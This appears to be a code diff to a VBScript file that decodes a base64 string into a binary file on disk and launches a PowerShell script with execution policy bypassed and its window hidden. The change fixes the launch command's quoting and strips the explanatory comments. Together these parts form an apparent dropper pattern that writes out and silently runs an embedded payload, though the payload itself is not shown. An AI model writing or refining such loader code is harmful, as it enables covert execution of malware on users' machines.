@@ -9,7 +9,7 @@ Sub Run()
     Set shell = CreateObject("WScript.Shell")
     Dim command
     Dim timeDif
-    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & GetPS1FilePath()
+    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & GetPS1FilePath() + """"
     shell.Run command, 0, True
 End Sub
 
@@ -34,28 +34,23 @@ Function DecodeBase64ToFile(base64String, outputFilePath)
     Dim xmlDoc
     Set xmlDoc = CreateObject("Msxml2.DOMDocument.3.0")
     
-    ' Create an XML element with the base64 string
     Dim node
     Set node = xmlDoc.createElement("base64")
     node.dataType = "bin.base64"
     node.Text = base64String
     
-    ' Get the decoded binary data
     Dim binaryData
     binaryData = node.nodeTypedValue
     
-    ' Create a binary stream object to save the binary data to a file
     Dim stream
     Set stream = CreateObject("ADODB.Stream")
     stream.Type = 1 ' adTypeBinary
     stream.Open
     stream.Write binaryData
     
-    ' Save the binary stream to the specified output file path
     stream.SaveToFile outputFilePath, 2 ' adSaveCreateOverWrite
     stream.Close
     
-    ' Clean up
     Set stream = Nothing
     Set node = Nothing
     Set xmlDoc = Nothing
